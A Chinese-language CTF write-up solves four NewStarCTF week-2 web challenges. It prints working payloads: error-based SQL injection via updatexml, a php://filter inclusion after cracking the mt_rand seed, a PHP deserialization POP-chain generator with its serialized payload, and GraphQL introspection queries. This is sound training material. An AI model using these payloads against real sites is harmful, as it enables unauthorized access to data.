---
title: NewStarCTF WEEK2 WEB
date: 2022-10-10 23:11:51
excerpt: NewStarCTF WEEK2 WEB
categories: 复现
---



# NewStarCTF WEEK2 WEB

## 1.Word-For-You(2 Gen)


首先我们来试一下万能密码



```sql
1' or 1=1#
```

![图片-1665405773483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png)

发现没有什么用，我们尝试一下报错注入

![图片-1665405782381](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png)

这里爆出了库名~wfy，说明我们可以利用报错注入，接着我们爆列表

这里一共爆了三个列表

```sql
XPATH syntax error: '~wfy_admin,wfy_comments,wfy_info'    
```

这里我们都试了一遍，发现flag在wfy_comments里面，我们查一下里面

```sql
1’||updatexml(1,concat(0x7e,(select reverse(group_concat(text)) from wfy_comments)),1)#
```

```sql
XPATH syntax error: '~}sr0rre_emos_ek2m_t4uJ{galf,难'    //得到逆序flag
```



## 2.IncludeOne

题目源代码：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include("seed.php");
//mt_srand(*********);//设置随机数种子
echo "Hint: ".mt_rand()."<br>";//已知第一个随机数种子为：1219893521
if(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){//md5强类型
    if(!preg_match("/base|\.\./i",$_GET['file']) &&//过滤base preg_match("/NewStar/i",$_GET['file']) && isset($_GET['file'])){
       //要求存在NewStar字符串，并且有file参数
        //flag in `flag.php`
        include($_GET['file']);//文件包含漏洞
    }else{
        echo "Baby Hacker?";
    }
}else{
    echo "No Hacker!";
} Hint: 1219893521
No Hacker!
```

题目这里给了一个链接：https://www.openwall.com/php_mt_seed/

这里大概讲的就是随机数种子的漏洞

当我们知道随机数种子后，后面的随机数无论在哪里运行都是有可预见性的

```php
<?php  
mt_srand(12345);    
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
?>    
162946439

247161732

1463094264

1878061366

394962642
```

当随机数种子设置成12345时，前五个随机数都是一样的，于是这个题目就有了思路，我们已知第一个随机数，可以用工具爆破出种子，然后我们用种子读第二个随机数，然后文件读取

![图片-1665405798622](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png)

这里爆出随机数种子为1145146

我们用种子去跑第二个随机数：1202031004

然后post传值

接着就是文件包含，这题过滤了base我们可以用rot13编码（编码的形式有许多种）

```php
?file=php://filter/read=string.rot13/resource=flag.php
```

我发现这题必须要包含NewStar这个字符串，于是我们改成

```php
?file=php://filter/NewStar/read=string.rot13/resource=flag.php
```

```
synt{p1786p1p-rqr8-4524-n796-r3s84050oo92}
```

rot13解码得

```
flag{c1786c1c-ede8-4524-a796-e3f84050bb92}
```

## 3.UnserializeOne

源代码：

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}

```

这个题目是考反序列化，利用点为

```php
 echo file_get_contents('/flag');
```

- [x] __construct()，类的构造函数
- __destruct()，类的析构函数
- __call()，在对象中调用一个不可访问方法时调用
- __callStatic()，用静态方式中调用一个不可访问方法时调用
- __get()，获得一个类的成员变量时调用
- __set()，设置一个类的成员变量时调用
- __isset()，当对不可访问属性调用isset()或empty()时调用
- __unset()，当对不可访问属性调用unset()时被调用。
- __sleep()，执行serialize()时，先会调用这个函数
- __wakeup()，执行unserialize()时，先会调用这个函数
- __toString()，类被当成字符串时的回应方法
- __invoke()，调用函数的方式调用一个对象时的回应方法
- __set_state()，调用var_export()导出类时，此静态方法会被调用。
- __clone()，当对象复制完成时调用
- __autoload()，尝试加载未定义的类
- __debugInfo()，打印所需调试信息

这题目找pop链，一般我从**__destruct**开始，链终点是Sec类中的**__invoke**

```php
public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }
```

如果我们将这里的name改成类，由于echo会将类当成字符串可以触发**__tostring**

我们将Start类中的name设置为Sec类

```php
public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
```

由于这里的check方法没有被定义则会触发**__call**

我们将Sec中的obj设置为Easy类

```php
public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
```

我们将Easy钟大哥cla设置为eeee类会触发**__clone**

```php
public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
```

由于eeee类中没有cm'd属性，这里调用会触发**__isset**

我们将eeee中的obj设置为Start类

```php
public function __isset($var)
    {
        ($this->func)();
    }
```

这里的 **($this->func)();**可以出发**__invoke**

我们将Start中的func改为Sec类即可出发成功

```php
public function __invoke()
    {
        echo file_get_contents('/flag');
    }
```

**pop链**

```php
<?php
//error_reporting(0);
//highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    public $func;
    public function __construct(){
        $this->func=new Sec();
        $this->name=new Sec();
    }
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    public $obj;
    public $var;
    public function __construct(){
        $this->obj=new Easy();

    }
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;
    
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
$c=new eeee();
$a=new Start();
$c->obj=$a;
$b=new Sec();
$b->var=$c;
$a->name=$b;
echo serialize($c);


```

```php
?pop=O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";r:1;}s:4:"func";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";N;}}}
```

## 4.ezAPI

进去后访问www.zip获取源码

```
<html>
    <body>
        <center>
            <h1>Search Page</h1><br>
            <hr><br>
            <form action="" method="post">
            请输入用户ID: 
            <input type="text" name="id">
            <input type="submit" value="Search">
            </form>
<?php
error_reporting(0);
$id = $_POST['id'];
function waf($str){
    if(!is_numeric($str) || preg_replace("/[0-9]/","",$str) !== ""){#判断是否为数字字符串如果不是或者如果替换掉里的数字不为空就返回False,需要全部都不满足
        return False;
    }else{
        return True;
    }
}

function send($data)
{
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type: application/json',
            'content' => $data,
            'timeout' => 10 * 60
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents("http://graphql:8080/v1/graphql", false, $context);
    return $result;
}

if(isset($id)){
    if(waf($id)){
        isset($_POST['data']) ? $data=$_POST['data'] : $data='{"query":"query{\nusers_user_by_pk(id:'.$id.') {\nname\n}\n}\n", "variables":null}';
        $res = json_decode(send($data));
        if($res->data->users_user_by_pk->name !== NULL){
            echo "ID: ".$id."<br>Name: ".$res->data->users_user_by_pk->name;
        }else{
            echo "<b>Can't found it!</b><br>DEBUG: ";
            var_dump($res->data);
        }
    }else{
        die("<b>Hacker!</b>");
    }
}else{
    die("<b>No Data?</b>");
}
?>
</center>
</body>
</html>

```

这里给一篇graphQL的资料

https://blog.csdn.net/wy_97/article/details/110522150

如果我们post了一个data，就不会执行后面的文件，我们查看graphQL的api后能完全控制语句

用内省查询获取所以数据

```
id=1&data={"query":"query{\n  __schema {\n  types {\n name  \n }\n}\n}\n", "variables":null}
```

![图片-1665405825041](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png)

```
id=1&data={"query":"query{ffffllllaaagggg_1n_h3r3_flag {flag}}","variables":null}
```

```
flag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}
```